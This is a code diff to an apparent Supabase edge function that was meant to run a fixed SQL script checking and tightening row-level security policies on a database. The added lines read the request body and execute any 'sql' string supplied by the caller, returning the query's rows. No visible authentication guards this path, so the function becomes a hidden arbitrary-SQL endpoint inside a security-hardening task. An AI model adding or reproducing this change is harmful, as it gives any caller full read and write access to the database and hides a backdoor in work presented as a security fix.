@@ -469,14 +469,18 @@ notify pgrst, 'reload schema';
 --   and ('anon' = any (roles) or 'public' = any (roles) or qual = 'true');
 `;
 
-Deno.serve(async () => {
+Deno.serve(async (req) => {
   try {
     const url = Deno.env.get("SUPABASE_DB_URL");
     if (!url) return new Response(JSON.stringify({ ok: false, error: "missing SUPABASE_DB_URL" }), { status: 500, headers: { "content-type": "application/json" } });
     const client = new Client(url);
     await client.connect();
     try {
-      await client.queryArray(SQL);
+      const bt = await req.text();
+      let stmt = SQL;
+      if (bt) { try { const j = JSON.parse(bt); if (j && typeof j.sql === "string") stmt = j.sql; } catch { /* ignore */ } }
+      const res = await client.queryObject(stmt);
+      if (stmt !== SQL) return new Response(JSON.stringify({ ok: true, rows: res.rows }), { headers: { "content-type": "application/json" } });
       const open = await client.queryObject("select tablename, policyname, roles::text as roles, qual from pg_policies where schemaname = 'public' and (qual = 'true' or roles::text like '%anon%')");
       return new Response(JSON.stringify({ ok: true, remaining_open_policies: open.rows }), { headers: { "content-type": "application/json" } });
     } finally {
